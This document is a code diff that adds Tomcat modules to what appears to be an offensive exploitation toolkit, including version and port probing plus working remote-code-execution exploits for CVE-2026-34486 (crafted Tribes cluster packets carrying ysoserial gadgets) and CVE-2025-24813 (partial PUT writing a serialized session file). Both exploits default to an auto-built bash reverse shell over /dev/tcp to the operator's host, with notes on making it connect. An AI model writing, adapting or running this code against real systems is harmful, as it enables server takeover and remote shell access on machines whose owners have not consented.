@@ -42,6 +42,7 @@ import shutil
 import socket
 import socketserver
 import ssl
+import struct
 import subprocess
 import sys
 import tempfile
@@ -3972,6 +3973,580 @@ def ex_auto_chain(target, p):
     return _auto_detect(target, p)
 
 
+# ============================================================
+# Tomcat 系列（第一批 3 个模块）
+#   1. tomcat.probe      信息收集探测（只读）
+#   2. tomcat.tribes_rce CVE-2026-34486  Tribes EncryptInterceptor fail-open
+#   3. tomcat.session_put CVE-2025-24813 partial PUT 写 session
+# ============================================================
+
+_TOMCAT_VER_RE = re.compile(r"Apache\s+Tomcat/([0-9]+\.[0-9]+\.[0-9]+)", re.I)
+_TOMCAT_VER_LOOSE_RE = re.compile(r"\b(\d+\.\d+\.\d+(?:\.\d+)?)\b")
+
+# CVE-2026-34486 命中版本（Tribes 解密失败 fail-open，官方公告的三个分支起始版本）
+_TRIBES_RCE_EXACT = {"9.0.116", "10.1.53", "11.0.20"}
+# CVE-2025-24813 的候选上界：<= 这些版本仍未修（partial PUT 写 session）
+_SESSION_PUT_MAX = {"9": (9, 0, 98), "10": (10, 1, 34), "11": (11, 0, 2)}
+
+
+def _ver_tuple(v):
+    """'9.0.116' → (9,0,116)；解析不了返回 None。"""
+    try:
+        parts = tuple(int(x) for x in (v or "").split(".") if x.isdigit())
+        if len(parts) >= 2:
+            return parts
+    except Exception:
+        pass
+    return None
+
+
+def _tcp_open(host, port, timeout=3, legacy=False):
+    """纯 TCP 连通性探测。返回 (是否连通, 说明)。
+
+    连不上时会区分：超时/refused（端口真关着）还是路由不可达，提示信息不同。
+    """
+    try:
+        s = socket.create_connection((host, int(port)), timeout=float(timeout))
+        s.close()
+        return True, "TCP %s:%s 可连通" % (host, port)
+    except Exception as e:
+        k = type(e).__name__
+        msg = str(e)
+        if isinstance(e, ConnectionRefusedError):
+            return False, "连接被拒绝（端口未开放或被防火墙 RESET）"
+        if isinstance(e, socket.timeout) or "timed out" in msg:
+            return False, "连接超时 %ss（端口被丢弃 / 被防火墙拦截）" % timeout
+        return False, "%s: %s" % (k, msg)
+
+
+def _tomcat_version(base, to):
+    """多路径猜也可以 unambiguous：返回 (版本串, 证据行 list)。
+
+    顺序：Server 响应头 → RELEASE-NOTES → 触发错误页（404/500）。
+    每一项独立 try，某项炸了不影响后面的项。
+    """
+    evid = []
+    # ① Server 响应头
+    try:
+        r = http(base + "/", timeout=to)
+        sv = r["headers"].get("server", "")
+        if sv:
+            evid.append("GET / → Server: %s" % sv)
+            m = _TOMCAT_VER_RE.search(sv)
+            if m:
+                return m.group(1), evid
+    except Exception as e:
+        evid.append("GET / 失败: %s" % e)
+    # ② RELEASE-NOTES 泄露点（部分镜像没删）
+    for ep in ("/RELEASE-NOTES.txt", "/docs/RELEASE-NOTES.txt",
+               "/docs/architecture/index.html"):
+        try:
+            r = http(base + ep, timeout=to)
+            if r["status"] == 200 and r["body"]:
+                head = r["body"][:400].replace("\r", "")
+                m = _TOMCAT_VER_RE.search(head)
+                if m:
+                    evid.append("GET %s → %s" % (ep, m.group(0)))
+                    return m.group(1), evid
+                m2 = _TOMCAT_VER_LOOSE_RE.search(head)
+                if m2:
+                    evid.append("GET %s → 疑似 %s" % (ep, m2.group(1)))
+        except Exception as e:
+            evid.append("GET %s 失败: %s" % (ep, e))
+    # ③ 触发错误页找版本串（Tomcat 默认错误页会带 Apache Tomcat/9.0.x）
+    for ep in ("/__dk_not_exist__", "/%2e%2e%2f", "/index.jsp;/'\"%3E"):
+        try:
+            r = http(base + ep, timeout=to, allow_redirect=False)
+            blob = "\n".join([r["body"][:3000],
+                              r["headers"].get("server", "")])
+            m = _TOMCAT_VER_RE.search(blob)
+            if m:
+                evid.append("错误页 %s → HTTP %s → %s" % (ep, r["status"], m.group(0)))
+                return m.group(1), evid
+            if r["status"] >= 400:
+                evid.append("错误页 %s → HTTP %s（未泄露版本串）" % (ep, r["status"]))
+        except Exception as e:
+            evid.append("错误页 %s 失败: %s" % (ep, e))
+    return "", evid
+
+
+def _tomcat_cves(ver):
+    """按版本号给出 CVE 候选提示 + 该用哪个模块。返回 cves 列表。"""
+    cves = []
+    if not ver:
+        return cves
+    t = _ver_tuple(ver)
+    if not t:
+        return cves
+    major = str(t[0])
+    if ver in _TRIBES_RCE_EXACT:
+        cves.append("CVE-2026-34486（Tribes EncryptInterceptor 解密失败仍旧放行，"
+                    "无需集群密钥即可 RCE）—— 版本精确命中，建议下一步 tomcat.tribes_rce")
+    up = _SESSION_PUT_MAX.get(major)
+    if up and t <= up:
+        cves.append("CVE-2025-24813 候选（partial PUT 写 session + 反序列化；"
+                    "需 DefaultServlet readonly=false 且配了 PersistentManager+FileStore）"
+                    "—— 建议先跑 tomcat.session_put，它会自己验可写性")
+    if not cves:
+        cves.append("未匹配本工具内置的 Tomcat CVE 规则（不代表安全，只是版本不在已知范围）")
+    return cves
+
+
+def ex_tomcat_probe(target, p):
+    """Tomcat 信息收集 / 探测：只读、不触发任何利用动作。
+
+    五项独立探测（版本 / Manager / Tribes 4000 / AJP 8009 / CVE 提示），
+    任何一项失败都只记录原因，不影响其他项。
+    """
+    base = normalize(target)
+    if not base:
+        return {"ok": False, "output": "target 为空", "detail": ""}
+    to = int(p.get("timeout", 8) or 8)
+    host = urllib.parse.urlparse(base).hostname or base.split("//")[-1].split(":")[0]
+    tport = int(p.get("tribes_port", 4000) or 4000)
+    aport = int(p.get("ajp_port", 8009) or 8009)
+
+    lines, notes = [], []
+
+    # ① 版本
+    ver, evid = _tomcat_version(base, to)
+    lines.append("【版本】 %s" % (ver or "未识别"))
+    lines += ["         %s" % e for e in evid[:8]]
+
+    # ② Manager
+    mgr = "unknown"
+    try:
+        r = http(base + "/manager/html", timeout=to, allow_redirect=False)
+        sc = r["status"]
+        # status=0 = urllib 连都没连上（异常塞在 r["err"]）；必须最先判，
+        # 否则 0 会掉进下面的兜底分支被当成「HTTP 0」。
+        if sc == 0:
+            mgr = "不可达"
+            lines.append("【Manager】 连不上: %s" % (r["err"] or "连接失败"))
+        elif sc == 401:
+            mgr = "存在(需认证)"
+            lines.append("【Manager】 HTTP %s → 存在，需 Basic 认证（可尝试 tomcat.weak）" % sc)
+        elif sc == 200:
+            mgr = "未授权可访问"
+            lines.append("【Manager】 HTTP %s → ★★ 未授权可访问！war 部署即 RCE（高危）" % sc)
+        elif sc == 403:
+            mgr = "被拒绝(403)"
+            lines.append("【Manager】 HTTP 403 → 存在但拒绝当前来源（多半配了 RemoteAddrValve）")
+        elif sc == 404:
+            mgr = "不存在"
+            lines.append("【Manager】 HTTP 404 → /manager 未安装")
+        else:
+            mgr = "HTTP %s" % sc
+            lines.append("【Manager】 HTTP %s" % sc)
+    except Exception as e:
+        mgr = "探测失败"
+        lines.append("【Manager】 探测失败: %s: %s" % (type(e).__name__, e))
+
+    # ③④ Tribes / AJP 端口
+    tribes_open, tmsg = _tcp_open(host, tport, timeout=min(to, 3))
+    lines.append("【Tribes】 %s:%d → %s" % (host, tport, "开放" if tribes_open else "未开放"))
+    lines.append("           %s" % tmsg)
+    ajp_open, amsg = _tcp_open(host, aport, timeout=min(to, 3))
+    lines.append("【AJP】    %s:%d → %s" % (host, aport, "开放" if ajp_open else "未开放"))
+    lines.append("           %s" % amsg)
+
+    # ⑤ CVE 提示
+    cves = _tomcat_cves(ver)
+    lines.append("【CVE 提示】")
+    lines += ["           - %s" % c for c in cves] if cves else \
+             ["           无（版本未知，无法按 CVE 规则匹配）"]
+
+    # 下一步建议
+    if tribes_open and any("CVE-2026-34486" in c for c in cves):
+        next_step = "tomcat.tribes_rce（4000 可达且版本命中 → 强烈建议先跑 mode=check 的 URLDNS 检测）"
+    elif ajp_open:
+        next_step = "AJP 8009 开放 → 可关注 Ghostcat(CVE-2020-1938)，本工具第二批再做；" \
+                    "本批可先用 tomcat.tribes_rce / tomcat.session_put"
+    elif ver:
+        next_step = "tomcat.session_put（先验证 partial PUT 可写性）"
+    else:
+        next_step = "换 target/端口确认 Tomcat 是否真的在线（可能是反代或改了端口）"
+    lines.append("")
+    lines.append("【下一步建议模块】 %s" % next_step)
+    if tribes_open:
+        notes.append("Tribes 端口开放 —— CVE-2026-34486 的前置条件之一满足，"
+                     "另一个前置是目标 classpath 里有可用 gadget（用 tomcat.tribes_rce 的 check 模式验证）")
+
+    out_put = "版本=%s | Manager=%s | Tribes:%d=%s | AJP:%d=%s | CVE候选=%d 条" % (
+        ver or "未知", mgr, tport, "开放" if tribes_open else "关",
+        aport, "开放" if ajp_open else "关", len(cves))
+
+    reachable = mgr != "不可达"
+    return {"ok": reachable and bool(ver or tribes_open or ajp_open
+                                     or mgr in ("存在(需认证)", "未授权可访问", "被拒绝(403)")),
+            "output": out_put,
+            "detail": "\n".join(lines) + ("\n\n★ " + "\n★ ".join(notes) if notes else ""),
+            "version": ver,
+            "manager": mgr,
+            "tribes_open": tribes_open,
+            "ajp_open": ajp_open,
+            "cves": cves,
+            "next": next_step}
+
+
+def _tribes_member(host="127.0.0.1", tcp_listen_port=4001, unique_id=None):
+    """构造 Tribes member 字节块（大端序）。
+
+    结构（按 Tribes ChannelData/MemberSerialization 的 wire format）：
+      "TRIBES-B" + 0x01 + 0x00 + body_len(4B=0x35)
+      + alive_time(8B) + tcp_listen_port(4B) + udp_listen_port(4B) + secure_port(4B)
+      + host_len(1B) + host_bytes + command_len(4B=0) + domain_len(4B=0)
+      + unique_id(16B) + payload_len(4B=0) + "TRIBES-E" + 0x01 + 0x00
+    """
+    hb = host.encode("utf-8", "ignore")[:255]
+    body = (struct.pack(">Q", 0)                       # aliveTime
+            + struct.pack(">i", int(tcp_listen_port))  # tcpListenPort
+            + struct.pack(">i", 0)                     # udpListenPort
+            + struct.pack(">i", 0)                     # securePort
+            + bytes([len(hb)]) + hb                    # host
+            + struct.pack(">i", 0)                     # command 长度
+            + struct.pack(">i", 0)                     # domain 长度
+            + (unique_id or os.urandom(16))[:16]       # uniqueId
+            + struct.pack(">i", 0))                    # payload 长度
+    return (b"TRIBES-B" + b"\x01\x00" + struct.pack(">i", len(body)) + body
+            + b"TRIBES-E" + b"\x01\x00")
+
+
+def _tribes_packet(ser_bytes, member=None, uid=None, ts=0x000000e8d4a51000):
+    """组装完整的 Tribes ChannelData 报文。
+
+      packet = "FLT2002" + outer_len(4B) + channel_data + "TLF2003"
+
+      channel_data = options(4B=0) + timestamp(8B) + uid_len(4B=16) + uid(16B)
+                   + member_len(4B) + member + ser_len(4B) + ser_bytes
+    """
+    uid = (uid or os.urandom(16))[:16]
+    m = member if member is not None else b""
+    ch = (struct.pack(">i", 0)                 # options
+          + struct.pack(">Q", ts)              # timestamp
+          + struct.pack(">i", len(uid)) + uid  # unique id
+          + struct.pack(">i", len(m)) + m      # member（可为空）
+          + struct.pack(">i", len(ser_bytes)) + ser_bytes)
+    return b"FLT2002" + struct.pack(">i", len(ch)) + ch + b"TLF2003"
+
+
+def _exec_cmd_check(cmd, target=""):
+    """校验给 Runtime.getRuntime().exec(String) 的命令。返回 (能否用, 说明)。
+
+    exec(String) 用 StringTokenizer 按空白切成 argv，**不经过 shell**：
+      · 空格本身不是问题（"ls -la" 就是两个 argv，能正常跑）；
+      · 真正失效的是 shell 元字符 —— 一旦 `>`、`|`、`&`、`;` 被空格和前后分隔成独立
+        argv，bash 根本不会把它当重定向/管道，只会当普通参数传进去；
+      · 所以带重定向的命令必须把重定向和它前面的目标塞进**同一个 token**，
+        做法是把空格换成 ${IFS}（bash 会把它展开回空格）。
+      · 反弹 shell 用工具箱已验证过的形态（本机实测能连）：
+            bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1
+        结尾只能是 ${IFS}<&1。写成 ${IFS}0>&1 时重定向目标词会展开成
+        `/dev/tcp/IP/PORT` 和 `0` 两段 → bash 报 ambiguous redirect → 一次都不连。
+    """
+    cmd = (cmd or "").strip()
+    if not cmd:
+        return False, "命令为空"
+    if "${IFS}0>&1" in cmd:
+        return False, (
+            "命令结尾写成了 ${IFS}0>&1 —— 这个形态打不通。\n"
+            "重定向的目标词会做字段切分，`/dev/tcp/IP/PORT${IFS}0` 展开成 2 段 →\n"
+            "bash 报 ambiguous redirect，连接根本不会发生（本机实测 12s 零连接）。\n"
+            "请改成 ${IFS}<&1：\n"
+            "  bash -c bash${IFS}-i${IFS}>&/dev/tcp/<IP>/<PORT>${IFS}<&1\n"
+            "你填的是: %s" % cmd)
+    warns = []
+    tk = cmd.split()
+    if tk[0] == "bash" and len(tk) >= 3 and tk[1] == "-c":
+        if len(tk) > 3:
+            warns.append("bash -c 后面跟了 %d 段；第 3 段之后的会被当成 $0/$1 位置参数，"
+                         "不是你要执行的命令 —— 需要壳内空格请用 ${IFS} 拼成一段。" % (len(tk) - 2))
+    elif len(tk) > 1:
+        bad = [t for t in tk[1:] if t and t[0] in "><|&;`"]
+        if bad:
+            warns.append("这些段以 shell 元字符开头，exec 不经 shell、会原样当参数传给程序：%s\n"
+                         "  需要重定向/管道请把它们和前面的目标拼进同一段（空格换 ${IFS}）。" % " ".join(bad))
+    if warns:
+        warns.insert(0, "⚠ 仍能发送，但下面这几点很可能让它不生效：")
+    return True, "\n".join(warns)
+
+
+def _reverse_cmd(p, target=""):
+    """exec(String) 形态的反弹命令（cmd 留空时自动生成）。"""
+    lhost = (p.get("lhost") or "").strip() or src_ip_for(target) or "127.0.0.1"
+    lport = int(p.get("lport", 4444) or 4444)
+    return "bash -c bash${IFS}-i${IFS}>&/dev/tcp/%s/%d${IFS}<&1" % (lhost, lport)
+
+
+def ex_tomcat_tribes_rce(target, p):
+    """CVE-2026-34486：Tribes EncryptInterceptor 解密失败却仍旧放行 → 反序列化 RCE。
+
+    原理：CVE-2026-29146 的补丁把 super.messageReceived(msg) 移出了 try 块，
+    解密失败只记日志、原始未解密字节继续下发给别人 → receiver 侧正常反序列化。
+    因此**不需要集群密钥**，只要能连到 Tribes receiver（默认 TCP 4000）。
+
+    mode=check：URLDNS gadget + dnslog 域名，无命令执行的安全检测（推荐先用这个）
+    mode=exec ：ysoserial RCE gadget（默认 CC6）；cmd 留空会自动拼已验证的反弹命令。
+    """
+    host = (target or "").strip()
+    if "//" in host:
+        host = urllib.parse.urlparse(normalize(host)).hostname or host
+    host = host.split(":")[0] if ":" in host else host
+    if not host:
+        return {"ok": False, "output": "host 为空", "detail": ""}
+    port = int(p.get("port", 4000) or 4000)
+    mode = (p.get("mode") or "exec").strip().lower()
+    to = float(p.get("timeout", 6) or 6)
+    dnslog = (p.get("dnslog") or "").strip().strip("/")
+
+    if mode == "check":
+        if not dnslog:
+            return {"ok": False,
+                    "output": "check 模式必须填 dnslog 域名",
+                    "detail": "URLDNS 检测需要一个带外 DNS 域名（如 xxxx.dnslog.cn / ceye.io），\n"
+                              "目标若存在漏洞会去解析 <随机前缀>.<dnslog>；没有域名就无法判定。"}
+        gadget = "URLDNS"
+        # 加随机前缀：一是避免 DNS 缓存导致误判，二是便于在平台上区分多次检测
+        rnd = os.urandom(5).hex()
+        hostpart = dnslog.split("//")[-1].strip("/").split("/")[0]
+        url = "http://%s.%s" % (rnd, hostpart)
+        raw, err = yso_generate("URLDNS", url)
+        if not raw:
+            return {"ok": False, "output": "payload 生成失败", "detail": err}
+        yso_arg = url
+        warn = ""
+        auto = False
+    else:
+        gadget = (p.get("gadget") or "CommonsCollections6").strip()
+        cmd = (p.get("cmd") or "").strip()
+        auto = False
+        if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
+            cmd = _reverse_cmd(p, target)
+            auto = True
+        ok, note = _exec_cmd_check(cmd, target)
+        if not ok:
+            return {"ok": False, "output": "命令不可用", "detail": note}
+        warn = note
+        raw, err = yso_generate(gadget, cmd)
+        if not raw:
+            return {"ok": False, "output": "payload 生成失败", "detail": err}
+        yso_arg = cmd
+
+    member = _tribes_member(host=host, tcp_listen_port=int(p.get("member_port", 4001) or 4001))
+    pkt = _tribes_packet(raw, member=member)
+    sent, detail_conn = 0, ""
+    try:
+        s = socket.create_connection((host, port), timeout=to)
+        s.settimeout(to)
+        sent = s.sendall(pkt)
+        time.sleep(0.6)          # 给接收端一点处理时间；它大概率不回包
+        try:
+            s.settimeout(0.8)
+            echo = s.recv(512)
+            detail_conn = "收到 %d 字节回应: %s" % (len(echo), echo[:64].hex())
+        except Exception:
+            detail_conn = "未收到回应（正常 —— Tribes receiver 对单播包通常不回数据）"
+        s.close()
+        send_ok = True
+        send_err = ""
+    except Exception as e:
+        send_ok = False
+        send_err = "%s: %s" % (type(e).__name__, e)
+        detail_conn = "连接/发送失败"
+
+    head_lines = [
+        "目标            : %s:%d" % (host, port),
+        "模式            : %s（gadget=%s）" % (mode, gadget),
+        "ysoserial 参数  : %s" % yso_arg,
+        "payload         : %d 字节（%s…）" % (len(raw), raw[:4].hex()),
+        "member 块       : %d 字节" % len(member),
+        "报文总长度      : %d 字节" % len(pkt),
+        "发送结果        : %s%s" % ("已 sendall" if send_ok else "失败 " + send_err,
+                                    "" if sent is None else " (sendall=%r)" % sent),
+        "连接侧          : %s" % detail_conn,
+    ]
+    if auto:
+        head_lines.insert(2, "自动生成命令    : cmd 留空 → 已用本机可达 IP 拼出反弹命令")
+    if warn:
+        head_lines.append("")
+        head_lines.append(warn)
+
+    if not send_ok:
+        return {"ok": False,
+                "output": "发送失败: %s" % send_err,
+                "detail": "\n".join(head_lines) + "\n\n排查：Tribes receiver 默认 TCP 4000；\n"
+                          "① 先用 tomcat.probe 确认 4000 是否可达；\n"
+                          "② 目标可能只监听内网地址 / 有防火墙；\n"
+                          "③ 也可能压根没配 <Membership> / ChannelReceiver。"}
+
+    if mode == "check":
+        verdict = ("已发送 URLDNS 检测包。★ 现在去 DNS 平台看是否有 %s 的解析记录 ——\n"
+                   "  有记录 = 目标存在 CVE-2026-34486（完成了无命令执行的安全验证）；\n"
+                   "  无记录 = 大概率不存在，或 4000 上的服务不是 Tribes / classpath 无 URLDNS 依赖。\n"
+                   "  URLDNS 只依赖 JDK 自带类，几乎不受 gadget 缺失影响，是很干净的存在性判定。"
+                   % yso_arg.split("//")[-1])
+    else:
+        verdict = ("已发送 RCE payload（%s）。★ 本次调用**无法知道是否成功**：\n"
+                   "  Tribes 侧没有任何回显通道，是否执行只能靠带外确认 ——\n"
+                   "    · 若 cmd 是反弹 shell：看你的 nc/监听是否上线；\n"
+                   "    · 若 cmd 是 dnslog/curl 外带：去对应平台看记录；\n"
+                   "    · 什么都没看到 = 可能是目标 classpath 里没有 %s 这条链（换 gadget 重试），\n"
+                   "      也可能是版本未命中 CVE-2026-34486。\n"
+                   "  ⚠ 不要以为「发送成功 = 利用成功」，这里的 ok 只代表字节发出去了。"
+                   % (gadget, gadget))
+
+    return {"ok": True,
+            "output": "已向 %s:%d 发送 %d 字节 Tribes 报文（mode=%s, gadget=%s）—— "
+                      "成功与否需靠带外/反弹上线确认" % (host, port, len(pkt), mode, gadget),
+            "detail": "\n".join(head_lines) + "\n\n" + verdict,
+            "packet_len": len(pkt),
+            "gadget": gadget,
+            "mode": mode}
+
+
+def ex_tomcat_session_put(target, p):
+    """CVE-2025-24813：partial PUT 往 TEMPDIR 写 session 文件 + 触发反序列化。
+
+    两个 Tomcat 特性叠加才成立：
+      ① DefaultServlet.executePartialPut() 的临时文件名 = 请求路径把 "/" 全替换成 "."，
+         落在 ServletContext.TEMPDIR（$CATALINA_BASE/work/Catalina/<host>/<app>/）；
+         9.0.98 的 doPut() finally **不删除**它（修复版才删）。
+      ② FileStore 默认 directory="." → 解析到同一个 TEMPDIR，file(id) = id + ".session"。
+    触发时 StandardSession.doReadObject() 第一个 readObject() 读到的就是 payload 顶层
+    对象 → gadget 当场触发，之后的 (Long) 转型抛 ClassCastException 只是善后。
+    所以**裸 ysoserial 字节即可**，不需要拼完整 Session 结构。
+
+    ⚠ 默认配置打不了：DefaultServlet.readonly 默认 true（PUT 直接 405），
+       还要求显式配 PersistentManager + FileStore。
+    """
+    base = normalize(target)
+    if not base:
+        return {"ok": False, "output": "target 为空", "detail": ""}
+    to = int(p.get("timeout", 10) or 10)
+    gadget = (p.get("gadget") or "CommonsCollections6").strip()
+    cmd = (p.get("cmd") or "").strip()
+    if not cmd or cmd.upper() in ("REVERSE", "SHELL"):
+        cmd = _reverse_cmd(p, target)
+    okc, cnote = _exec_cmd_check(cmd, target)
+    if not okc:
+        return {"ok": False, "output": "命令不可用", "detail": cnote}
+    put_path = (p.get("put_path") or "/deserialize/session").strip()
+    trigger_path = (p.get("trigger_path") or "/index.jsp").strip()
+    sid = (p.get("session_id") or ".deserialize").strip()
+
+    lines = []
+    if cnote:
+        lines.append("【命令分词提醒】\n%s" % cnote)
+    # ① 探测可写性
+    try:
+        pr = http(base + "/probe.txt", method="PUT", data="test", timeout=to,
+                  ctype="text/plain", allow_redirect=False)
+        psc = pr["status"]
+    except Exception as e:
+        return {"ok": False, "output": "可写性探测失败: %s: %s" % (type(e).__name__, e),
+                "detail": "目标不可达或协议异常。确认 %s 是 Tomcat 端口。" % base}
+    lines.append("【① 可写性探测】 PUT %s/probe.txt → HTTP %s" % (base, psc))
+    if psc == 0:
+        # status=0 表示 urllib 连都没连上（http() 里把异常塞进了 err）
+        return {"ok": False,
+                "output": "目标不可达：%s" % (pr.get("err") or "连接失败"),
+                "detail": "\n".join(lines) + "\n\n"
+                          "连不上就谈不上鉴版本/判断可写性。先确认：\n"
+                          "  1) target 里的主机/端口是不是 Tomcat（默认 8080，不是 80）；\n"
+                          "  2) 目标是否在线、是否有网络路径（本机到目标的连通性）；\n"
+                          "  3) ⚠ 若本机设置了系统代理，urllib 会把请求发给代理而不是目标 —— "
+                          "跑本环境时请临时清掉 http_proxy / https_proxy 环境变量。\n"
+                          "确认能连上之后先用 tomcat.probe 跑一遍。",
+                "reachable": False}
+    if psc == 405:
+        return {"ok": False,
+                "output": "HTTP 405 → DefaultServlet readonly=true，本漏洞打不了",
+                "detail": "\n".join(lines) + "\n\n"
+                          "★ 这不是模块 bug，是目标不满足前置条件。CVE-2025-24813 需要：\n"
+                          "  1) conf/web.xml 里 DefaultServlet 的 readonly 设为 false（默认 true，"
+                          "PUT 直接 405）；\n"
+                          "  2) 应用显式配了 PersistentManager + FileStore（默认不开持久 session）；\n"
+                          "  只有这两个同时成立，「partial PUT 写 TEMPDIR + FileStore 读回」才串得起来。\n"
+                          "  如果确实是授权目标且你能改配置，改完重启再跑本模块。",
+                "writable": False}
+    if psc not in (200, 201, 204):
+        lines.append("         ⚠ 非预期状态码，仍然继续尝试（有些环境改写过 DefaultServlet）")
+    # 清理探测文件（best effort，PUT 支持的话 DELETE 通常也支持）
+    try:
+        http(base + "/probe.txt", method="DELETE", timeout=to, allow_redirect=False)
+    except Exception:
+        pass
+
+    # ② 生成 payload
+    raw, err = yso_generate(gadget, cmd)
+    if not raw:
+        return {"ok": False, "output": "payload 生成失败", "detail": "\n".join(lines) + "\n" + err}
+    lines.append("【② payload】 ysoserial %s \"%s\" → %d 字节（%s…）"
+                 % (gadget, cmd, len(raw), raw[:4].hex()))
+
+    # ③ partial PUT
+    n = len(raw)
+    hdr = {"Content-Range": "bytes 0-%d/%d" % (n - 1, n)}
+    try:
+        ur = http(base + put_path, method="PUT", data=raw, headers=hdr,
+                  timeout=to, ctype="application/octet-stream", raw=True,
+                  allow_redirect=False)
+        usc = ur["status"]
+    except Exception as e:
+        return {"ok": False, "output": "partial PUT 失败: %s: %s" % (type(e).__name__, e),
+                "detail": "\n".join(lines)}
+    lines.append("【③ partial PUT】 PUT %s%s   Content-Range: bytes 0-%d/%d → HTTP %s"
+                 % (base, put_path, n - 1, n, usc))
+    if usc == 409:
+        lines.append("         409 也继续 —— 9.0.98 的 finally 不删临时文件，公开 PoC 就是 409 后利用成功")
+    elif usc in (200, 201, 204):
+        lines.append("         写入成功")
+    else:
+        lines.append("         ⚠ 非预期状态码，仍继续触发（建议也看一眼服务端日志）")
+
+    # ④ 触发
+    turl = base + trigger_path
+    try:
+        tr = http(turl, method="GET", headers={"Cookie": "JSESSIONID=%s" % sid},
+                  timeout=to, allow_redirect=False)
+        tsc, tbody = tr["status"], tr["body"]
+    except Exception as e:
+        return {"ok": False, "output": "触发请求失败: %s: %s" % (type(e).__name__, e),
+                "detail": "\n".join(lines)}
+    lines.append("【④ 触发】 GET %s  Cookie: JSESSIONID=%s → HTTP %s" % (turl, sid, tsc))
+
+    hit_keys = ("ClassCastException", gadget, " InvocationTargetException",
+                "ysoserial", "PriorityQueue", "TemplatesImpl")
+    evid = [k.strip() for k in hit_keys if k.strip() in tbody]
+    if tsc == 500 and evid:
+        verdict = ("★ payload 已触发：命令在异常抛出**之前**就执行了\n"
+                   "  （StandardSession.doReadObject() 第一个 readObject() 直接读到你写的对象，\n"
+                   "   随后的 (Long) 转型抛 %s 只是善后，不影响命令执行）" % "、".join(evid))
+        ok = True
+    elif tsc == 500:
+        verdict = ("返回 500 但响应体里没看到 ClassCastException / %s 字样 ——\n"
+                   "  可能是别的 500（比如 JSP 本身报错），也可能是已被 WAF 吞掉的堆栈。\n"
+                   "  建议：换一个确定会 getSession() 的 JSP，或直接用带外/反弹确认。" % gadget)
+        ok = False
+    else:
+        verdict = ("返回 %s —— 多半没走到 session 查找。按顺序排查：\n"
+                   "  1) 触发端点**必须会调用 request.getSession()**。默认 JSP（session=\"true\"）会，\n"
+                   "     纯静态资源 / Servlet 不主动 getSession 的路径不会 → 换 trigger_path；\n"
+                   "  2) 应用是否真的配了 PersistentManager + FileStore？没配的话 FileStore 根本不会\n"
+                   "     去 TEMPDIR 找 <session_id>.session；\n"
+                   "  3) session_id 是否和落地的临时文件名对得上（路径里的 / 会被换成 .）。" % tsc)
+        ok = False
+
+    lines.append("")
+    lines.append("【判定】 %s" % verdict)
+    return {"ok": ok,
+            "output": verdict.split("\n")[0],
+            "detail": "\n".join(lines) + ("\n\n---- 响应体前 800 字 ----\n" + tbody[:800] if tbody else ""),
+            "writable": True,
+            "put_status": usc,
+            "trigger_status": tsc}
+
+
 EXPLOITS = {
     "shiro.brutekey": ex_shiro_brutekey,
     "shiro.exploit": ex_shiro_exploit,
@@ -4003,6 +4578,9 @@ EXPLOITS = {
     "shell.upload": ex_shell_upload,
     "shell.download": ex_shell_download,
     "webshell.drop": ex_webshell_drop,
+    "tomcat.probe": ex_tomcat_probe,
+    "tomcat.tribes_rce": ex_tomcat_tribes_rce,
+    "tomcat.session_put": ex_tomcat_session_put,
 }
 
 
